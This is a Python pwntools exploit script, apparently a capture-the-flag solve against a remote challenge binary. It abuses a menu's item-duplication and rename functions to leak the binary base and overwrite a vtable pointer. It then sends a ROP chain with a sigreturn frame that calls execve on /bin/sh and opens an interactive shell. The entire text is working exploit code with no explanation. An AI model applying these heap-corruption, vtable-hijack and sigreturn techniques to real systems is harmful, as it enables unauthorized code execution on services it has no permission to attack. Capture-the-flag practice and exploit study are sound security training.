from pwn import *
import builtins
from subprocess import run

def send(after: bytes, val, newline=False):
    match type(val):
        case builtins.int | builtins.str:
            val = f"{val}".encode()
        case builtins.bytes:
            pass

    if newline: val += b"\n"
    p.sendafter(after, val)

def sendline(after: bytes, val):
    send(after, val, newline=True)

def consumable(build: int, id: str):
    sendline(b": ", build)
    sendline(b": ", 2)
    sendline(b": ", id)

def dupe(build: int, idx: int):
    sendline(b": ", build)
    sendline(b": ", 3)
    sendline(b": ", idx)

def show(build: int):
    sendline(b": ", build)
    sendline(b": ", 6)

def name(build: int, data: bytes):
    sendline(b": ", build)
    sendline(b": ", 5)
    sendline(b": ", data)

context.terminal = ["kitty"]
script = """
c
"""
if args.GDB:
    p = remote("localhost", 5000)
    p.recv(1)
    pid = int(run("pgrep -fx /app/run", shell=True, capture_output=True, encoding="utf-8").stdout)
    gdb.attach(pid, gdbscript=script, exe="./chal")
elif args.REMOTE:
    p = remote("smiley.cat", "44045")
else:
    p = remote("localhost", 5000)
p.recvuntil(b"Choose")

for _ in range(16):
    consumable(0, "Cappa Juice")
for _ in range(17):
    consumable(1, "Cappa Juice")
dupe(0, 0)

show(0)
leak = int(p.recvregex(rb"id: ([0-9]+)\)", capture=True).group(1))
log.info(f"{leak = :#x}")

file = ELF("./chal", checksec=False)
filebase = leak + 0x25f80
log.info(f"{filebase = :#x}")

name(0, b"A" * 257)
name(1, b"B" * 257)
name(2, b"C" * 257)

name(2, b"A" * 16)
name(1, b"B")
name(0, b"C" * 16)

name(0, b" " * 510 + B"Z")
name(1, b"Z" * 16)

vtable = filebase + 0xad38
adjust = filebase + 0x346a
rdi_1x = filebase + 0x3479
rsi_1x = filebase + 0x7feb
rsp_3x = filebase + 0x83b6
syscall_5x = filebase + 0x96a1
log.info(f"{rsp_3x = :#x}")

name(2, b"\0\0" + p64(vtable)[:6])

context.arch = "amd64"
payload = p64(adjust) * 4
payload += b"/bin/sh\0" * 3
payload += p64(rdi_1x) + p64(0) + p64(0)
payload += p64(rsi_1x) + p64(filebase + 0xd000) + p64(0)
payload += p64(syscall_5x) + p64(0) * 5
payload += p64(syscall_5x)
frame = SigreturnFrame()
frame.rsp = filebase + 0xe000
frame.rip = syscall_5x
frame.rax = 0x3b
frame.rdi = vtable + 0x20
frame.rsi = 0
frame.rdx = 0
payload += bytes(frame)
log.info(f"{len(payload) = :#x}")

name(1, payload.ljust(0x180, b"\0"))

for _ in range(0x17):
    consumable(0, "Cappa Juice")

payload = b"A" * 0xb0
payload += p64(rsp_3x) + p64(vtable + 0x20)
log.info(f"{len(payload) = :#x}")

consumable(0, payload)
consumable(0, "Cappa Juice")

p.sendline(b"A" * 14)

p.interactive()